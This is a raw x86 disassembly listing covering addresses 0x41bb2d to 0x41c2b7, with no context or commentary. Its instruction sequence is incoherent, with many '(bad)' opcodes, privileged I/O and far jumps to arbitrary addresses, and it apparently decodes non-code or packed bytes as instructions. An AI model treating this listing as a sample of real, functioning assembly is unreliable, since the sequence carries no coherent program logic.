  41bb2d:	jb     0x41bb99
  41bb2f:	into   
  41bb30:	jbe    0x41bac5
  41bb32:	outs   dx,BYTE PTR ds:[esi]
  41bb33:	leave  
  41bb34:	inc    ecx
  41bb35:	inc    esp
  41bb36:	dec    eax
  41bb37:	(bad)  
  41bb38:	mov    eax,0xe8cbbb62
  41bb3d:	xor    al,0xf3
  41bb3f:	mov    ebp,DWORD PTR [edi-0x35]
  41bb42:	sub    DWORD PTR [esi+0x47d4071b],edi
  41bb48:	cmp    al,0x31
  41bb4a:	jne    0x41bb33
  41bb4c:	mov    edi,DWORD PTR [edi+ecx*1]
  41bb4f:	or     eax,0x6f5913f5
  41bb54:	pop    es
  41bb55:	ins    DWORD PTR es:[edi],dx
  41bb56:	or     eax,0xf0eaa4d1
  41bb5b:	or     dh,BYTE PTR [esp+ebx*4]
  41bb5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb5f:	outs   dx,BYTE PTR ds:[esi]
  41bb60:	inc    DWORD PTR ds:0x60d72829
  41bb66:	repnz pop edx
  41bb68:	xor    eax,0xc50b976b
  41bb6d:	jmp    0x6b623a3
  41bb72:	mov    eax,ds:0x28f29e7a
  41bb77:	sbb    DWORD PTR [ebx-0x7c],edx
  41bb7a:	jl     0x41bbeb
  41bb7c:	xlat   BYTE PTR ds:[ebx]
  41bb7d:	arpl   WORD PTR [eax-0x7ec1f15],bp
  41bb83:	test   DWORD PTR [ebx-0x3a8fb79],esp
  41bb89:	fs mov cl,0xa1
  41bb8c:	dec    eax
  41bb8d:	ss inc edx
  41bb8f:	dec    ecx
  41bb90:	pop    esi
  41bb91:	(bad)  
  41bb92:	in     al,dx
  41bb93:	dec    ebx
  41bb94:	adc    BYTE PTR [edi+0x6e],al
  41bb97:	test   dl,ch
  41bb99:	add    dh,bh
  41bb9b:	dec    ebx
  41bb9c:	cmova  ebp,DWORD PTR [eax-0x2]
  41bba0:	loop   0x41bb4b
  41bba2:	pusha  
  41bba3:	jae    0x41bb4c
  41bba5:	imul   ebx,DWORD PTR [edx],0x48fc3901
  41bbab:	(bad)  [eax+0x47]
  41bbae:	icebp  
  41bbaf:	sbb    bh,dh
  41bbb1:	aam    0x82
  41bbb3:	fst    DWORD PTR [ebx+0x59]
  41bbb6:	scas   eax,DWORD PTR es:[edi]
  41bbb7:	xchg   edx,eax
  41bbb8:	dec    ebx
  41bbb9:	cmp    dl,al
  41bbbb:	push   eax
  41bbbc:	inc    esi
  41bbbd:	scas   al,BYTE PTR es:[edi]
  41bbbe:	adc    dl,ch
  41bbc0:	adc    BYTE PTR [esi+0x76],bl
  41bbc3:	jge    0x41bc17
  41bbc5:	scas   eax,DWORD PTR es:[edi]
  41bbc6:	in     eax,0x8e
  41bbc8:	aas    
  41bbc9:	fnstcw WORD PTR [ebp-0x620db29c]
  41bbcf:	cmp    DWORD PTR [esi+ebp*2],esp
  41bbd2:	sbb    dh,BYTE PTR [ecx+0x54213db7]
  41bbd8:	pop    esp
  41bbd9:	mov    al,0x3
  41bbdb:	dec    ecx
  41bbdc:	fiadd  WORD PTR [eax+0x247b54b5]
  41bbe2:	fidiv  WORD PTR [edx]
  41bbe4:	cld    
  41bbe5:	out    0x61,al
  41bbe7:	push   es
  41bbe8:	dec    ebp
  41bbe9:	lods   eax,DWORD PTR ds:[esi]
  41bbea:	outs   dx,DWORD PTR ds:[esi]
  41bbeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bbec:	mov    ecx,0x2aa81058
  41bbf1:	dec    ebx
  41bbf2:	rol    BYTE PTR [edi],cl
  41bbf4:	mov    dl,0x9c
  41bbf6:	cld    
  41bbf7:	add    eax,0x8e2c7a53
  41bbfc:	stos   BYTE PTR es:[edi],al
  41bbfd:	pop    esp
  41bbfe:	cwde   
  41bbff:	ret    
  41bc00:	pop    esp
  41bc01:	mov    al,BYTE PTR [edx]
  41bc03:	popa   
  41bc04:	jmp    0x66be88b
  41bc09:	jno    0x41bbf4
  41bc0b:	bound  eax,QWORD PTR [esi]
  41bc0d:	aaa    
  41bc0e:	cmp    esi,DWORD PTR [edx-0x12]
  41bc11:	mov    esi,0xf7d32bf1
  41bc16:	jbe    0x41bbf4
  41bc18:	hlt    
  41bc19:	sbb    bl,BYTE PTR [ebx-0x7b]
  41bc1c:	xor    eax,esp
  41bc1e:	iret   
  41bc1f:	dec    ebx
  41bc20:	(bad)  
  41bc21:	pop    eax
  41bc22:	mov    dl,0x3e
  41bc24:	retf   0xcee4
  41bc27:	push   eax
  41bc28:	in     eax,dx
  41bc29:	or     eax,0x7b165fa5
  41bc2e:	or     esi,ebp
  41bc30:	aam    0xa3
  41bc32:	popf   
  41bc33:	icebp  
  41bc34:	repz jnp 0x41bbd1
  41bc37:	add    edx,ebx
  41bc39:	ins    BYTE PTR es:[edi],dx
  41bc3a:	js     0x41bc1c
  41bc3c:	leave  
  41bc3d:	adc    bh,BYTE PTR [eax-0x5a288bca]
  41bc43:	mov    eax,0xf5e23a25
  41bc48:	out    0x16,al
  41bc4a:	ins    BYTE PTR es:[edi],dx
  41bc4b:	pushf  
  41bc4c:	jb     0xca02bf38
  41bc52:	adc    cl,BYTE PTR [eax-0xf2ea48c]
  41bc58:	pop    ss
  41bc59:	jo     0x41bc83
  41bc5b:	push   es
  41bc5c:	es cdq 
  41bc5e:	cli    
  41bc5f:	(bad)  
  41bc60:	cwde   
  41bc61:	ret    
  41bc62:	cmp    esp,DWORD PTR ds:0x7d677a4a
  41bc68:	je     0x41bbf7
  41bc6a:	fstp   QWORD PTR [esi]
  41bc6c:	mov    bh,0x57
  41bc6e:	js     0x41bc45
  41bc70:	and    cl,BYTE PTR [edx+0x35]
  41bc73:	push   ecx
  41bc74:	sub    DWORD PTR [edx-0x5bc8da01],edx
  41bc7a:	xchg   esp,eax
  41bc7b:	mov    ds:0x9f413dcd,al
  41bc80:	jbe    0x41bc98
  41bc82:	cmp    eax,0xca701b46
  41bc87:	push   ss
  41bc88:	xor    esp,DWORD PTR [ebp+eiz*4-0x42250133]
  41bc8f:	xor    eax,0xc483f546
  41bc94:	xchg   ebx,eax
  41bc95:	out    0x3d,eax
  41bc97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc98:	in     al,0xb9
  41bc9a:	xchg   edi,eax
  41bc9b:	fbstp  TBYTE PTR [edi-0x77]
  41bc9e:	pop    eax
  41bc9f:	adc    cl,BYTE PTR [eax+0x59475d0a]
  41bca5:	xor    BYTE PTR ds:0xed36643,0x11
  41bcac:	ds sti 
  41bcae:	aaa    
  41bcaf:	cmp    BYTE PTR [ecx-0x658b1ebc],ch
  41bcb5:	popf   
  41bcb6:	xchg   edi,eax
  41bcb7:	cdq    
  41bcb8:	and    dl,ah
  41bcba:	sbb    al,0xdf
  41bcbd:	xor    DWORD PTR [ecx+eiz*8+0x15be4c0e],ebp
  41bcc4:	rol    DWORD PTR [ecx+0x31077e48],1
  41bcca:	popf   
  41bccb:	dec    eax
  41bccc:	sbb    edi,DWORD PTR [ebx+0x20]
  41bccf:	push   ebx
  41bcd0:	xor    BYTE PTR [ebx],ch
  41bcd2:	mov    es:0x72a01a59,eax
  41bcd8:	mov    ch,0x9d
  41bcda:	mov    ebx,0xfac1ed3a
  41bcdf:	jp     0xf8164236
  41bce5:	(bad)  
  41bce6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bce7:	mov    cs,WORD PTR [edi+0x62e9d4f8]
  41bced:	in     eax,dx
  41bcee:	inc    esi
  41bcef:	repnz imul esi,DWORD PTR [eax-0x588e7d78],0x422eb320
  41bcfa:	mov    es,WORD PTR [ebp+0x61a5ee5b]
  41bd00:	cld    
  41bd01:	scas   al,BYTE PTR es:[edi]
  41bd02:	jge    0x41bd81
  41bd04:	jmp    0xa885:0x4163cbb
  41bd0b:	jmp    0x41bd45
  41bd0d:	push   cs
  41bd0e:	or     eax,0xe0c22c
  41bd13:	push   eax
  41bd14:	lods   al,BYTE PTR ds:[esi]
  41bd15:	adc    al,0xd3
  41bd17:	add    BYTE PTR [edi-0x60],dl
  41bd1a:	or     esi,edi
  41bd1c:	fld    st(7)
  41bd1e:	push   ss
  41bd1f:	and    BYTE PTR [eax+0x7],0xaf
  41bd23:	mov    edi,0xec5baad5
  41bd28:	xor    BYTE PTR [esi-0x6b],0x9f
  41bd2c:	push   ebp
  41bd2d:	pushf  
  41bd2e:	(bad)  
  41bd2f:	je     0x41bd51
  41bd31:	stos   DWORD PTR es:[edi],eax
  41bd32:	xchg   edi,eax
  41bd33:	dec    al
  41bd35:	out    dx,al
  41bd36:	adc    al,BYTE PTR [edx+esi*4-0xff9299d]
  41bd3d:	mov    dh,BYTE PTR [ebx-0x299c6519]
  41bd43:	jns    0x41bd73
  41bd45:	outs   dx,DWORD PTR ds:[esi]
  41bd46:	neg    DWORD PTR [ebp+0xc1f99ee]
  41bd4c:	adc    eax,0xe1167402
  41bd51:	aam    0xe5
  41bd53:	jb     0x41bd40
  41bd55:	nop
  41bd56:	mov    ds,eax
  41bd58:	xchg   DWORD PTR [edx-0x3943e4c3],ecx
  41bd5e:	pop    ebp
  41bd5f:	and    dl,cl
  41bd61:	js     0x41bd49
  41bd63:	push   esp
  41bd64:	pop    es
  41bd65:	xchg   ebx,eax
  41bd66:	not    DWORD PTR ds:0xf0121475
  41bd6c:	add    cl,BYTE PTR [eax]
  41bd6e:	pusha  
  41bd6f:	mov    edi,0x6907a5fd
  41bd74:	inc    esi
  41bd75:	mov    ecx,ebx
  41bd77:	jmp    0xba3aadb0
  41bd7c:	jp     0x41bddf
  41bd7e:	das    
  41bd7f:	or     eax,0x6fb8144f
  41bd84:	push   0x208753ee
  41bd89:	add    DWORD PTR [ecx],0xb8bec000
  41bd8f:	adc    al,0x17
  41bd91:	sub    bl,BYTE PTR [ecx]
  41bd93:	cmp    al,BYTE PTR [edi-0x1d]
  41bd96:	hlt    
  41bd97:	test   BYTE PTR [esi-0x5a],0xc8
  41bd9b:	adc    BYTE PTR [esi-0x4d3e3d98],0x96
  41bda2:	jle    0x41bd9f
  41bda4:	fistp  QWORD PTR [ebp-0x2c]
  41bda7:	test   BYTE PTR [edi],0xc
  41bdaa:	daa    
  41bdab:	push   ds
  41bdac:	inc    esp
  41bdad:	mov    eax,ds:0x40febe19
  41bdb2:	ret    
  41bdb3:	ss hlt 
  41bdb5:	call   FWORD PTR [esi-0x64]
  41bdb8:	fsub   st,st(7)
  41bdba:	test   ah,dh
  41bdbc:	dec    edx
  41bdbd:	mov    ebx,0x47565857
  41bdc2:	addr16 into 
  41bdc4:	(bad)  
  41bdc5:	cmp    edi,DWORD PTR [eax-0x1e]
  41bdc8:	and    BYTE PTR [eax+0x527312d1],cl
  41bdce:	and    ebp,DWORD PTR [ebp+0x48]
  41bdd1:	nop
  41bdd2:	test   eax,0x7a030fa7
  41bdd7:	push   es
  41bdd8:	or     eax,0x299b2789
  41bddd:	adc    eax,0x1475dec5
  41bde2:	ins    BYTE PTR es:[edi],dx
  41bde3:	fdiv   QWORD PTR [edx+0x2faab5a4]
  41bde9:	hlt    
  41bdea:	dec    esi
  41bdeb:	xor    BYTE PTR [eax],bh
  41bded:	test   eax,0x80acb256
  41bdf2:	int    0xfe
  41bdf4:	popa   
  41bdf5:	aaa    
  41bdf6:	jmp    0x6e3a:0xc10c2f2a
  41bdfd:	iret   
  41bdfe:	sub    ebx,edx
  41be00:	cwde   
  41be01:	inc    esp
  41be02:	xchg   DWORD PTR [edi+ebx*8],esp
  41be05:	inc    ebp
  41be06:	inc    ebp
  41be07:	jl     0x41bde1
  41be09:	mov    ebx,0xcddc9dde
  41be0e:	or     BYTE PTR [ecx-0x2d404818],dh
  41be14:	adc    DWORD PTR [ecx-0x11],edx
  41be17:	add    eax,0x14ee1568
  41be1c:	or     eax,0xb3c6fece
  41be21:	(bad)  
  41be22:	mov    DWORD PTR [ebp+0x31],esp
  41be25:	jnp    0x41be0f
  41be27:	and    ebx,DWORD PTR [esi+0xe]
  41be2a:	jne    0x41bde8
  41be2c:	fs iret 
  41be2e:	inc    eax
  41be2f:	fnstcw WORD PTR [esi+0x4fc50a93]
  41be35:	das    
  41be36:	ret    0x8a12
  41be39:	ds pop ecx
  41be3b:	adc    al,0xc2
  41be3d:	fwait
  41be3e:	or     dl,BYTE PTR [edi-0x5d]
  41be41:	pop    ebx
  41be42:	outs   dx,DWORD PTR ds:[esi]
  41be43:	stos   BYTE PTR es:[edi],al
  41be44:	inc    esp
  41be45:	nop
  41be46:	ins    DWORD PTR es:[edi],dx
  41be47:	lock jmp 0xeddf:0xc3ea1fb3
  41be4f:	(bad)  
  41be50:	jmp    0x41bdeb
  41be52:	fwait
  41be53:	xor    DWORD PTR [edi-0x4c],esi
  41be56:	jnp    0x41be1d
  41be58:	pop    esp
  41be59:	dec    ebp
  41be5a:	sub    ch,BYTE PTR ds:0x43bf82bd
  41be60:	and    al,0xf5
  41be62:	push   0x49
  41be64:	mov    esp,0x3c2ccb01
  41be69:	xor    al,0x31
  41be6b:	fs cmp al,0xb5
  41be6e:	ffree  st(0)
  41be70:	sub    esi,DWORD PTR [ecx+0x62cc2e1f]
  41be76:	pop    ebp
  41be77:	fmul   st,st(6)
  41be79:	(bad)  
  41be7a:	out    0x3b,eax
  41be7c:	xor    eax,0xc5086709
  41be81:	popf   
  41be82:	call   0x799f:0xbaa373d4
  41be89:	call   0x71a2402
  41be8e:	sbb    al,0xdc
  41be90:	pop    ecx
  41be91:	imul   ecx,edx,0xaefc5334
  41be97:	out    0x34,eax
  41be99:	repz sbb al,0x39
  41be9c:	jb     0x41bf0c
  41be9e:	sub    dl,BYTE PTR [ebx-0x61]
  41bea1:	icebp  
  41bea2:	popa   
  41bea3:	stc    
  41bea4:	mov    ds:0xce6d2ec0,eax
  41bea9:	sar    DWORD PTR ds:0xf5f35a1a,0x5
  41beb0:	call   0x324:0x8ee29cd0
  41beb7:	and    DWORD PTR [ebp-0x4e0c67e7],esp
  41bebd:	pop    esp
  41bebe:	in     eax,dx
  41bebf:	les    ecx,FWORD PTR [eax+0x3a455baf]
  41bec5:	and    al,0x4a
  41bec7:	push   esi
  41bec8:	(bad)  
  41beca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41becb:	ds mov ecx,0xc9059027
  41bed1:	cmp    eax,0xa7bda517
  41bed6:	xlat   BYTE PTR ds:[ebx]
  41bed7:	pop    ecx
  41bed8:	bound  ebp,QWORD PTR [esi+eax*1]
  41bedb:	mov    ebx,0x37840f3a
  41bee0:	and    al,0xa0
  41bee2:	pushf  
  41bee3:	lods   al,BYTE PTR ds:[esi]
  41bee4:	pop    es
  41bee5:	aam    0x97
  41bee7:	and    al,0xa1
  41bee9:	sbb    dh,ch
  41beeb:	add    eax,0x337e62cd
  41bef0:	les    ebx,FWORD PTR [ecx-0x75]
  41bef3:	and    BYTE PTR [eax],dh
  41bef5:	shl    DWORD PTR [ebx],1
  41bef7:	(bad)  
  41bef8:	cmp    eax,0x4bc02c95
  41befd:	or     eax,0x28b83f51
  41bf02:	ins    DWORD PTR es:[edi],dx
  41bf03:	jb     0x41bece
  41bf05:	dec    esp
  41bf06:	les    edi,FWORD PTR [ebx+ebx*2+0x6c]
  41bf0a:	push   esp
  41bf0b:	cmp    al,0xf7
  41bf0d:	cmp    al,0xff
  41bf0f:	aad    0xd4
  41bf11:	cmc    
  41bf12:	cmp    DWORD PTR [ebp+ebp*8-0x75040934],0x72
  41bf1a:	xchg   edx,eax
  41bf1b:	daa    
  41bf1c:	mov    ebp,0x8937199e
  41bf21:	aas    
  41bf22:	call   0xba7e:0x406e64be
  41bf29:	xor    cl,dh
  41bf2b:	push   edi
  41bf2c:	popa   
  41bf2d:	imul   dh
  41bf2f:	jbe    0x41bf01
  41bf31:	inc    ebx
  41bf32:	or     ebp,DWORD PTR [edx]
  41bf34:	(bad)  
  41bf36:	and    esp,DWORD PTR [ebp-0x21]
  41bf39:	clc    
  41bf3a:	add    ebx,DWORD PTR [ebp+0x69]
  41bf3d:	inc    ecx
  41bf3e:	cmp    eax,0xa7556ae1
  41bf43:	mov    dh,0xd8
  41bf45:	dec    ecx
  41bf46:	mov    esp,fs
  41bf48:	jbe    0x41beec
  41bf4a:	cmp    edi,DWORD PTR [edi]
  41bf4c:	dec    edi
  41bf4d:	xor    esi,DWORD PTR [ebp-0x47054479]
  41bf53:	sbb    BYTE PTR [ebx-0x12],0x7b
  41bf57:	add    DWORD PTR [ebx-0x6fdd3521],esi
  41bf5d:	or     eax,0xe206a548
  41bf62:	push   ebp
  41bf63:	mov    esi,edx
  41bf65:	test   BYTE PTR [ebx+ebx*2+0x73],dl
  41bf69:	aam    0xa2
  41bf6b:	shr    DWORD PTR [ecx+eax*4-0x650358c1],0x9b
  41bf73:	mov    WORD PTR [edx],ss
  41bf75:	aad    0xb6
  41bf77:	add    BYTE PTR [ebx+0x625e17aa],bl
  41bf7d:	fld    QWORD PTR [ecx+0x3f]
  41bf80:	mov    WORD PTR ds:0x52a57532,ss
  41bf86:	jmp    0xd53ec5b1
  41bf8b:	int    0x3b
  41bf8d:	cmp    al,0x10
  41bf8f:	mov    DWORD PTR [esi-0x3f],ecx
  41bf92:	jae    0x41bfb0
  41bf94:	retf   0xa5c7
  41bf97:	call   0xd6dd:0x72255e36
  41bf9e:	fsubr  st(6),st
  41bfa0:	push   edx
  41bfa1:	in     al,0xe0
  41bfa3:	jb     0x41bf2a
  41bfa5:	push   esi
  41bfa6:	pop    ds
  41bfa7:	jmp    0x41c01b
  41bfa9:	sbb    eax,0xe9ac6700
  41bfae:	int    0xfd
  41bfb0:	xchg   ebp,eax
  41bfb1:	and    edi,DWORD PTR [ebp-0x5f57e78d]
  41bfb7:	sub    al,0x6
  41bfb9:	mov    ds:0x1c88a6f0,eax
  41bfbe:	stc    
  41bfbf:	js     0x41bf6b
  41bfc1:	fist   WORD PTR [edi+0x6114bb12]
  41bfc7:	es pop edx
  41bfc9:	int3   
  41bfca:	fadd   st(0),st
  41bfcc:	push   es
  41bfcd:	clc    
  41bfce:	int    0xca
  41bfd0:	jle    0x41bfaf
  41bfd2:	inc    esi
  41bfd3:	mov    ecx,0x846c9f3
  41bfd8:	dec    esp
  41bfd9:	hlt    
  41bfda:	ror    DWORD PTR [edx+0x1ea37861],0x6b
  41bfe1:	call   0xdc52:0x5e1e9d04
  41bfe8:	rcl    DWORD PTR [ebp+0x42],1
  41bfeb:	pop    ss
  41bfec:	cmp    BYTE PTR cs:[ebp-0x56d9d97e],ch
  41bff3:	cli    
  41bff4:	or     DWORD PTR [ebp-0x110ff4b0],ebx
  41bffa:	cwde   
  41bffb:	repnz fist DWORD PTR ds:0xf3de9f99
  41c002:	inc    ebx
  41c003:	scas   al,BYTE PTR es:[edi]
  41c004:	iret   
  41c005:	inc    edx
  41c006:	cmp    ebp,DWORD PTR [edi+0xb]
  41c009:	loope  0x41bfcb
  41c00b:	cmp    ebp,0x54
  41c00e:	jmp    0x41bfa8
  41c010:	aaa    
  41c011:	aam    0x17
  41c013:	neg    edi
  41c015:	sub    al,0x46
  41c017:	(bad)  
  41c018:	xor    DWORD PTR [ebx],ebp
  41c01a:	stos   DWORD PTR es:[edi],eax
  41c01b:	dec    edx
  41c01c:	or     BYTE PTR [edi-0x3307bd35],dl
  41c022:	imul   esp
  41c024:	mov    eax,0x5fe666c4
  41c029:	adc    eax,0xbc38cdd9
  41c02e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c02f:	cdq    
  41c030:	or     dh,BYTE PTR ds:0xd3b1761d
  41c036:	stc    
  41c037:	gs test eax,0xb224f92a
  41c03d:	shl    DWORD PTR [eax],0xf4
  41c040:	cmp    al,0x39
  41c042:	imul   ebx,ebp,0xffffffd1
  41c045:	or     DWORD PTR [edx],0x6d
  41c048:	(bad)  
  41c049:	sub    BYTE PTR [eax+eiz*1-0xa],bh
  41c04d:	(bad)  
  41c04e:	lea    ecx,[eax-0x6d]
  41c051:	inc    eax
  41c052:	cmp    eax,0xa137ff1b
  41c057:	xchg   esi,eax
  41c058:	mov    dh,0x8e
  41c05a:	std    
  41c05b:	and    al,0x7c
  41c05d:	push   esp
  41c05e:	leave  
  41c05f:	add    esi,ecx
  41c061:	jbe    0x41c044
  41c063:	ret    0xa8b4
  41c066:	and    BYTE PTR [eax],al
  41c068:	retf   
  41c069:	(bad)  
  41c06a:	fwait
  41c06b:	inc    ecx
  41c06c:	mov    WORD PTR [edi-0x6b],cs
  41c06f:	sahf   
  41c070:	pusha  
  41c071:	inc    edi
  41c072:	icebp  
  41c073:	inc    ecx
  41c074:	out    dx,al
  41c075:	sbb    DWORD PTR [ecx-0x11],esp
  41c078:	in     al,dx
  41c079:	pop    ebp
  41c07a:	mov    esp,0x9f36cef7
  41c07f:	or     edx,DWORD PTR [edi+0x19]
  41c082:	test   eax,0x8af5b3ea
  41c087:	adc    al,0xfa
  41c089:	or     al,0x1c
  41c08b:	aad    0x90
  41c08d:	sti    
  41c08e:	inc    edi
  41c08f:	mov    BYTE PTR [ebx+0x8],bh
  41c092:	shl    DWORD PTR [eax],0x39
  41c095:	mov    edx,DWORD PTR [eax-0x49]
  41c098:	fist   DWORD PTR [esi+ebx*4-0x1c]
  41c09c:	(bad)  [esi+0x6efbadb5]
  41c0a2:	cld    
  41c0a3:	sub    edi,DWORD PTR [ebp+0x54]
  41c0a6:	sub    DWORD PTR [ecx-0x58a140d8],esi
  41c0ac:	xor    DWORD PTR [edx-0x45],0xffffffc9
  41c0b0:	add    BYTE PTR [eax+0x32],0x58
  41c0b4:	or     DWORD PTR [ebx+0x79],ecx
  41c0b7:	fstp   DWORD PTR [ebx]
  41c0b9:	push   esp
  41c0ba:	in     eax,0x35
  41c0bc:	add    dl,bl
  41c0be:	aad    0x7f
  41c0c0:	pop    ss
  41c0c1:	add    eax,0xc626835
  41c0c6:	inc    ecx
  41c0c7:	pop    esp
  41c0c8:	test   eax,0xa0edb24b
  41c0cd:	sub    BYTE PTR [esi],cl
  41c0cf:	jmp    0x3320efbf
  41c0d4:	xchg   BYTE PTR ds:[edx+0x1e],al
  41c0d8:	add    bl,BYTE PTR [esi]
  41c0da:	in     al,0x50
  41c0dc:	gs jecxz 0x41c115
  41c0df:	(bad)  
  41c0e0:	adc    ecx,eax
  41c0e2:	stos   DWORD PTR es:[edi],eax
  41c0e3:	and    esp,eax
  41c0e5:	push   eax
  41c0e6:	sub    BYTE PTR [esi-0x61],cl
  41c0e9:	xor    al,0x40
  41c0eb:	push   es
  41c0ec:	add    ch,BYTE PTR [edx-0x22]
  41c0ef:	mov    cl,0x27
  41c0f1:	cmp    eax,0xaafca9f1
  41c0f6:	pop    ecx
  41c0f7:	ret    
  41c0f8:	xor    BYTE PTR [edx],ch
  41c0fa:	jns    0x41c134
  41c0fc:	mov    bl,0x81
  41c0fe:	adc    eax,0x3f313f8
  41c103:	or     dl,BYTE PTR ds:0x9e9f6dd7
  41c109:	xor    bh,BYTE PTR [eax]
  41c10b:	scas   eax,DWORD PTR es:[edi]
  41c10c:	mov    bh,0xc3
  41c10e:	dec    BYTE PTR [ebx]
  41c110:	repnz xchg ebp,esp
  41c113:	adc    cl,BYTE PTR [ebx-0x1e]
  41c116:	xchg   ecx,eax
  41c117:	add    al,0xa1
  41c119:	in     al,0xdc
  41c11b:	aam    0x85
  41c11d:	fsubrp st(1),st
  41c11f:	sbb    ch,BYTE PTR [ebp+0x2acdcada]
  41c125:	addr16 push 0xffffff94
  41c128:	push   ebx
  41c129:	xchg   dl,ch
  41c12b:	adc    BYTE PTR [esi+eax*2-0x1de89dba],bl
  41c132:	(bad)  
  41c133:	sbb    dh,ah
  41c135:	xlat   BYTE PTR ds:[ebx]
  41c136:	pop    esi
  41c137:	jo     0x41c0ca
  41c139:	mov    edx,0x3717f7cc
  41c13e:	pop    esp
  41c13f:	pop    esp
  41c140:	push   ecx
  41c141:	cmp    esi,DWORD PTR [edx+0x65]
  41c144:	dec    ebx
  41c145:	lds    eax,FWORD PTR [esi-0xebfd6a]
  41c14b:	popa   
  41c14c:	ror    DWORD PTR [ebx+0x660c3a6c],1
  41c152:	call   0x560c:0xcb3084e0
  41c159:	inc    esi
  41c15a:	icebp  
  41c15b:	nop
  41c15c:	call   0xd01f8331
  41c161:	aam    0xb9
  41c163:	ficom  DWORD PTR [esi+0x56]
  41c166:	out    0x98,eax
  41c168:	inc    ecx
  41c169:	daa    
  41c16a:	loop   0x41c12f
  41c16c:	push   0xffffffd2
  41c16e:	adc    al,0x72
  41c170:	mov    ds:0xf08fadff,al
  41c175:	div    DWORD PTR [edx]
  41c177:	add    esi,DWORD PTR [edx+0x5dc27bed]
  41c17d:	popf   
  41c17e:	popa   
  41c17f:	add    DWORD PTR [esi+ebx*1],0x8d927ac9
  41c186:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c187:	xor    DWORD PTR [edx+0x73],0x7f8fbb09
  41c18e:	pop    esp
  41c18f:	mov    cl,BYTE PTR [edi-0x14807241]
  41c195:	fiadd  WORD PTR [ecx+0x4]
  41c198:	fcmovnbe st,st(5)
  41c19a:	aas    
  41c19b:	xchg   edi,eax
  41c19c:	je     0x41c177
  41c19e:	mov    bh,0x81
  41c1a0:	dec    esp
  41c1a1:	mov    eax,ds:0x57550d25
  41c1a6:	and    al,0xa9
  41c1a8:	fst    DWORD PTR [ebp+0x17913ab4]
  41c1ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1af:	aas    
  41c1b0:	sub    BYTE PTR [eax+ebp*8+0x5a797d4],0x8d
  41c1b8:	and    ah,BYTE PTR [ebx]
  41c1ba:	mov    ds,WORD PTR [eax-0x30]
  41c1bd:	pop    edi
  41c1be:	loop   0x41c1f8
  41c1c0:	jg     0x41c181
  41c1c2:	(bad)  
  41c1c3:	adc    ch,BYTE PTR [eax]
  41c1c5:	cmp    cl,BYTE PTR [ebx+ebp*4]
  41c1c8:	mov    DWORD PTR [edx+0x4f445d28],ebp
  41c1ce:	ficom  WORD PTR ds:0xf1599a2d
  41c1d4:	data16 clc 
  41c1d6:	adc    DWORD PTR [edx],edi
  41c1d8:	daa    
  41c1d9:	stc    
  41c1da:	xor    BYTE PTR [eax+eiz*1+0x48],0xe1
  41c1df:	or     esp,edx
  41c1e1:	mov    ebp,0x10639e8a
  41c1e6:	fcom   DWORD PTR [edi]
  41c1e8:	jp     0x41c1d5
  41c1ea:	cmp    eax,0xc8e74e57
  41c1ef:	or     eax,DWORD PTR [ebp-0x17d0253c]
  41c1f5:	test   al,0xce
  41c1f7:	sub    BYTE PTR [ecx-0x7],bl
  41c1fa:	sub    ah,ah
  41c1fc:	cld    
  41c1fd:	pop    ebp
  41c1fe:	push   eax
  41c1ff:	gs out 0x4b,eax
  41c202:	push   ds
  41c203:	adc    eax,0xffffffdb
  41c206:	retf   0x7849
  41c209:	das    
  41c20a:	cdq    
  41c20b:	or     al,0xed
  41c20d:	push   sp
  41c20f:	gs xchg ebp,eax
  41c211:	push   edx
  41c212:	inc    eax
  41c213:	cmp    DWORD PTR [eax+esi*1+0x3fb138a1],ebx
  41c21a:	and    ah,BYTE PTR [edi]
  41c21c:	pusha  
  41c21d:	adc    dl,0xb3
  41c220:	lahf   
  41c221:	pop    edx
  41c222:	jmp    DWORD PTR [esi+0x2e]
  41c225:	add    BYTE PTR [edx+0x4],dh
  41c228:	dec    eax
  41c229:	fcmovnu st,st(2)
  41c22b:	int3   
  41c22c:	adc    DWORD PTR [edx],esp
  41c22e:	jl     0x41c27c
  41c230:	data16 and BYTE PTR [esi-0x73],bl
  41c234:	fstp   QWORD PTR [ebp+ecx*2-0x78]
  41c238:	mov    dl,0xae
  41c23a:	add    edx,edi
  41c23c:	pop    edx
  41c23d:	and    eax,0xac0e227a
  41c242:	and    eax,0xfe510cf4
  41c247:	or     eax,0xd0a43895
  41c24c:	repz cmp al,0x18
  41c24f:	es lock popf 
  41c252:	push   ecx
  41c253:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c254:	sbb    ah,bl
  41c256:	push   esp
  41c257:	call   0x39a9bd9a
  41c25c:	out    0x46,eax
  41c25e:	fmulp  st(6),st
  41c260:	mov    ecx,DWORD PTR ds:0x3b54b96
  41c266:	or     eax,0x6306b8e3
  41c26b:	sbb    al,0xb6
  41c26d:	aaa    
  41c26e:	mov    ch,0xdd
  41c270:	retf   0x46a0
  41c273:	xor    al,0xca
  41c275:	xor    al,0x6c
  41c277:	lods   al,BYTE PTR ds:[esi]
  41c278:	enter  0x2afb,0xe4
  41c27c:	pop    ss
  41c27d:	sub    al,0xba
  41c27f:	imul   edi,DWORD PTR [eax-0x61],0x3d
  41c283:	jecxz  0x41c242
  41c285:	mov    dh,0x55
  41c287:	outs   dx,DWORD PTR ds:[esi]
  41c288:	push   ds
  41c289:	sahf   
  41c28a:	xlat   BYTE PTR ds:[ebx]
  41c28b:	repz loope 0x41c221
  41c28e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c28f:	into   
  41c290:	sub    eax,0x87bc0371
  41c295:	in     al,dx
  41c296:	xor    DWORD PTR [ebx],ebx
  41c298:	and    al,0xd4
  41c29a:	push   ecx
  41c29b:	xlat   BYTE PTR ds:[ebx]
  41c29c:	jp     0x41c29b
  41c29e:	arpl   WORD PTR [ebx+0x0],bx
  41c2a1:	mov    al,ds:0x14c8fdfd
  41c2a6:	fdiv   st,st(3)
  41c2a8:	imul   ebp,DWORD PTR [eax],0x3d022487
  41c2ae:	not    BYTE PTR [ecx+0x4670603b]
  41c2b4:	fistp  WORD PTR [eax]
  41c2b6:	stc    
  41c2b7:	add    DWORD PTR [edi],ecx
